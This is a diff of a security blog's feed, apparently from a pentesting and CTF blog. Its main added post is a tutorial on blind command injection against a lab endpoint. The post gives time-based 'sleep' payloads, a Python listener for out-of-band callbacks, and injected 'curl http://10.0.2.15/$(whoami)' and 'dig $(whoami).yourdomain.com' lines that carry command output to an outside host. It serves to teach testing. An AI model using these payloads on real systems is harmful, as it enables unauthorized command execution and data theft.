+<p>In the field? Don’t just fire payloads. Read the system. Observe delays. Monitor DNS logs. Force OOB callbacks.</p>
+
+<h1 id="blind-command-injection-in-action">Blind Command Injection in Action</h1>
+
+<p>Let’s break down a live scenario.</p>
+
+<p>We’re working with a vulnerable endpoint:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+http://0.0.0.0:8080/invoice.php?file=invoice1
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*grndEgT4mupOjNQIl9qPWw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>At first glance, it just pulls a template based on the <code class="language-plaintext highlighter-rouge">file</code> parameter.</p>
+
+<hr />
+
+<h4 id="initial-test-verbose-attempt">Initial Test Verbose Attempt</h4>
+
+<p>We try to inject a simple system command:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+http://0.0.0.0:8080/invoice.php?file=invoice1;%20pwd
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0v77pl16YzMQL0mCrGpWFA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>The app responds:</p>
+
+<div class="alert-error">
+[!] Template not found: invoice1; pwd`
+</div>
+
+<p><strong>What this tells us:</strong>
+The input was executed or parsed, but we’re not seeing command output looks like it’s treating everything after <code class="language-plaintext highlighter-rouge">;</code> as part of the filename. So far, no solid confirmation of execution.</p>
+
+<hr />
+
+<h4 id="pivot-to-blind-injection">Pivot to Blind Injection</h4>
+
+<p>Now we go stealth: <strong>time-based testing</strong>.</p>
+
+<p>We craft this payload:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+http://0.0.0.0:8080/invoice.php?file=invoice1;%20sleep%205
+</code></pre>
+</div>
+
+<p><strong>Result:</strong>
+The page takes ~5 seconds to respond. That’s suspicious.</p>
+
+<p>To confirm, we bump it up:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+http://0.0.0.0:8080/invoice.php?file=invoice1;%20sleep%2010
+</code></pre>
+</div>
+
+<p><strong>Now it takes 10 seconds.</strong></p>
+
+<p><strong>Bingo.</strong> That delay is our echo in the void. We’re executing commands we’re just blind to the output.</p>
+
+<hr />
+
+<h4 id="visual-proof-gifscreenshot">Visual Proof (GIF/Screenshot)</h4>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_5R3d3TmgaQ4Cp192pe85w.gif" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>Visuals here reinforce what’s happening. The delay is tied to our payload. That’s how we <strong>detect blind command injection</strong>  by controlling time, not output.</p>
+
+<h1 id="out-of-band-oob-command-injection-detection">Out-of-Band (OOB) Command Injection Detection</h1>
+<hr />
+
+<p>Blind injection isn’t always about watching timeouts. Sometimes, the system talks <strong>just not to you</strong>. So we make it talk to <strong>us</strong>.</p>
+
+<p>We use <strong>OOB detection</strong> to catch these silent payloads by watching for outbound requests triggered by the app.</p>
+
+<hr />
+
+<h3 id="scenario-setup">Scenario Setup</h3>
+
+<p>Same target:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+http://0.0.0.0:8080/invoice.php?file=invoice1
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*grndEgT4mupOjNQIl9qPWw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>We want to test if this endpoint lets us execute system-level commands even if we get no visual output.</p>
+
+<hr />
+
+<h3 id="step-1-set-up-a-listener">Step 1: Set Up a Listener</h3>
+
+<p>We spin up a minimal Python HTTP server to catch any outbound callbacks triggered by tools like <code class="language-plaintext highlighter-rouge">curl</code>, <code class="language-plaintext highlighter-rouge">wget</code>, or even DNS requests.</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Python</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-python">
+# oob_listener.py
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import logging
+
+class TrapHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        logging.info(f"OOB GET request: {self.path}")
+        print(f"[+] Caught request from {self.client_address[0]} | PATH: {self.path}")
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'ACK')
+
+if __name__ == "__main__":
+    logging.basicConfig(level=logging.INFO)
+    server = HTTPServer(('0.0.0.0', 80), TrapHandler)
+    print("[*] Listening for incoming OOB requests on port 80...")
+    server.serve_forever()
+</code></pre>
+</div>
+
+<p><strong>Goal</strong>: Catch any network beacon from the target that hits this listener.</p>
+
+<hr />
+
+<h3 id="step-2-trigger-the-payload">Step 2: Trigger the Payload</h3>
+
+<p>Now that our trap is live, we inject this into the vulnerable URL:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+http://0.0.0.0:8080/invoice.php?file=invoice1; sleep 5; curl http://10.0.2.15/$(whoami)
+</code></pre>
+</div>
+
+<p>Or:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+http://0.0.0.0:8080/invoice.php?file=invoice1; sleep 5; curl http://10.0.2.15/$(pwd)
+</code></pre>
+</div>
+
+<p><strong>Watch the console</strong> if the app executes our command, it will leak the output (<code class="language-plaintext highlighter-rouge">whoami</code>, <code class="language-plaintext highlighter-rouge">pwd</code>, etc.) into the URL path and hit our trap server.</p>
+
+<hr />
+
+<h3 id="step-3-confirm-execution">Step 3: Confirm Execution</h3>
+
+<p>Your listener should output something like:</p>
+
+<p><code class="language-plaintext highlighter-rouge">[+] Caught request from 10.0.2.12 | PATH: /root</code></p>
+
+<p>That means your payload got executed, the app reached out to your server, and it returned the result of <code class="language-plaintext highlighter-rouge">$(whoami)</code> or <code class="language-plaintext highlighter-rouge">$(pwd)</code>.</p>
+
+<p><strong>command execution confirmed via OOB</strong>.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OyWoFZy4uaRWq_sMjEghNw.gif" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<hr />
+
+<h3 id="why-this-works">Why This Works</h3>
+
+<p>Most apps don’t restrict outbound traffic. So if you can’t see the result on the frontend, you make the backend deliver the result to your own server. It’s like putting a mic on the enemy comms.</p>
+
+<hr />
+
+<h3 id="pro-tips">Pro Tips</h3>
+
+<ul>
+  <li>
+    <p>Use tools like <strong>Burp Collaborator</strong>, <strong>RequestBin</strong>, or your own <strong>DNS/HTTP listener</strong>.</p>
+  </li>
+  <li>
+    <p>Want stealth? Use DNS-based callbacks: <code class="language-plaintext highlighter-rouge">dig $(whoami).yourdomain.com</code></p>
+  </li>
+  <li>
+    <p>OOB is king when you’re behind WAFs, filtered output, or sandboxed environments.</p>
+  </li>
+</ul>
+
+    </section>
+
+    <footer class="mt-8 text-sm text-gray-400">
+      <a href="/posts" class="hover:text-white">← Back to blog</a>
+    </footer>
+  </article>
+</div>
+
+<script>
+function filterPosts(tag) {
+  const posts = document.querySelectorAll('#posts-list li');
+  posts.forEach(post => {
+    const tags = post.getAttribute('data-tags').split(' ');
+    if (tag === 'all' || tags.includes(tag)) {
+      post.style.display = '';
+    } else {
+      post.style.display = 'none';
+    }
+  });
+}
+</script>
+
+    </section>
+
+    <footer class="mt-8 text-sm text-gray-400">
+      <a href="/posts" class="hover:text-white">← Back to blog</a>
+    </footer>
+  </article>
+<p>&lt;/div&gt;t-error”&gt;
+Error: Conversion failed when converting the varchar value ‘Microsoft SQL Server 2019’ to data type int.
+&lt;/div&gt;</p>
 
 <p>You now know the DB engine and version.</p>
 
@@ -3753,9 +4262,7 @@ SELECT id, ip, user_agent, note FROM logins WHERE user_agent = '' UNION SELECT i
   </li>
 </ul>
 
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Cky9Qb2di_0LlpwaJ6B8Pg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Yandex’s AI-Powered Reverse Image Search</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/yandex.html" rel="alternate" type="text/html" title="Yandex’s AI-Powered Reverse Image Search" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-02T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/yandex</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/yandex.html"><![CDATA[<p><img src="https://art.vx-underground.org/art/pancak3_giant_all-seeing_eye_glowing_neon_red_cables_retro_cybe_ea231a51-2642-42ce-b800-7f860e1f6a66.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
-
-<p>Yandex, Russia’s search titan, supercharges its reverse image search with AI, creating a powerful tool that goes way beyond pixel matching. Understanding this tech is critical for anyone playing offense or defense in the cyber game.</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Cky9Qb2di_0LlpwaJ6B8Pg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[SQL (Structured Query Language) SQL is a powerful language used to interact with relational databases. It lets you fetch, update, insert, and remove data using clear commands called statements.]]></summary></entry><entry><title type="html">Yandex’s AI-Powered Reverse Image Search</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/yandex.html" rel="alternate" type="text/html" title="Yandex’s AI-Powered Reverse Image Search" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-02T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/yandex</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/yandex.html"><![CDATA[<p>Yandex, Russia’s search titan, supercharges its reverse image search with AI, creating a powerful tool that goes way beyond pixel matching. Understanding this tech is critical for anyone playing offense or defense in the cyber game.</p>
 
 <h2 id="how-yandex-uses-ai-for-reverse-image-search">How Yandex Uses AI for Reverse Image Search</h2>
 
@@ -3891,9 +4398,7 @@ Click any image to view it in full screen.
 
 <ul>
   <li><a href="https://www.bellingcat.com/resources/how-tos/2019/12/26/guide-to-using-reverse-image-search-for-investigations/">Guide to Using Reverse Image Search for Investigations (Bellingcat)</a></li>
-</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Active Directory</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html" rel="alternate" type="text/html" title="Active Directory" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_satanic_computer_hackers_degen_dark_det_in_the_style_of_7e887c3c-d4a4-40d5-8718-097dc099bb36.png" alt="Set up Listener" width="500" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
-
-<p><strong>What is Active Directory?</strong>
+</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[Yandex, Russia’s search titan, supercharges its reverse image search with AI, creating a powerful tool that goes way beyond pixel matching. Understanding this tech is critical for anyone playing offense or defense in the cyber game.]]></summary></entry><entry><title type="html">Active Directory</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html" rel="alternate" type="text/html" title="Active Directory" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/ADintro.html"><![CDATA[<p><strong>What is Active Directory?</strong>
 Active Directory is a service developed by Microsoft that helps manage and organize computers, users, and other resources on a network. Think of it like a digital phonebook + control center that stores info about everything in a Windows domain (like usernames, passwords, computers, printers, etc.).</p>
 
 <hr />
@@ -4375,11 +4880,7 @@ This overrides any Block Inheritance. Basically says: <em>“No matter what, I r
 
 <p>Some of the settings are pretty self-explanatory. But if you’re unsure what something does, just <strong>double-click it</strong>  and go to the <strong>Explain</strong>  tab. It breaks down what the setting does and how it affects the system.</p>
 
-<p><img src="https://miro.medium.com/v2/resize:fit:408/1*-f4A6SKvl50JXlTaezoT1Q.png" alt="" /></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">SSTI1 (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI1.html" rel="alternate" type="text/html" title="SSTI1 (PicoCTF)" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI1</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI1.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_an_image_of_a_computer_hacker_in_the_style_of_pixelated_c429d5b3-77c4-4c70-9076-a2c3e7ff6f3a.png" alt="Set up Listener" width="400" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
-
-<h2 id="description">Description</h2>
-
-<blockquote>I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps!</blockquote>
+<p><img src="https://miro.medium.com/v2/resize:fit:408/1*-f4A6SKvl50JXlTaezoT1Q.png" alt="" /></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><summary type="html"><![CDATA[What is Active Directory? Active Directory is a service developed by Microsoft that helps manage and organize computers, users, and other resources on a network. Think of it like a digital phonebook + control center that stores info about everything in a Windows domain (like usernames, passwords, computers, printers, etc.).]]></summary></entry><entry><title type="html">SSTI1 (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI1.html" rel="alternate" type="text/html" title="SSTI1 (PicoCTF)" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI1</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI1.html"><![CDATA[<blockquote>I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps!</blockquote>
 
 <p><img src="https://miro.medium.com/v2/resize:fit:613/1*749ohjzhVKocSttt49oQWQ.png" alt="" /></p>
 
@@ -4423,11 +4924,7 @@ This overrides any Block Inheritance. Basically says: <em>“No matter what, I r
 
 <p><img src="https://miro.medium.com/v2/resize:fit:700/1*ppTGzKKyJ-A80GgxnjNRNg.png" alt="" /></p>
 
-<p>Now we can read the flag.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">SSTI2 (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI2.html" rel="alternate" type="text/html" title="SSTI2 (PicoCTF)" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI2</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI2.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_an_image_of_a_computer_hacker_in_the_style_of_pixelated_3252a918-2d74-4cbf-9ab0-a5aad868295a.png" alt="Set up Listener" width="400" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
-
-<h2 id="description">Description</h2>
-
-<blockquote>I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)</blockquote>
+<p>Now we can read the flag.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps!]]></summary></entry><entry><title type="html">SSTI2 (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI2.html" rel="alternate" type="text/html" title="SSTI2 (PicoCTF)" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI2</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI2.html"><![CDATA[<blockquote>I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)</blockquote>
 
 <p>This is going to be challenging, but we’ve got this because, based on the description…</p>
 
@@ -4456,4 +4953,4 @@ This overrides any Block Inheritance. Basically says: <em>“No matter what, I r
 
 <p>we’re in!!</p>
 
-<p>Thanks for reading</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry></feed>
+<p>Thanks for reading</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)]]></summary></entry></feed>
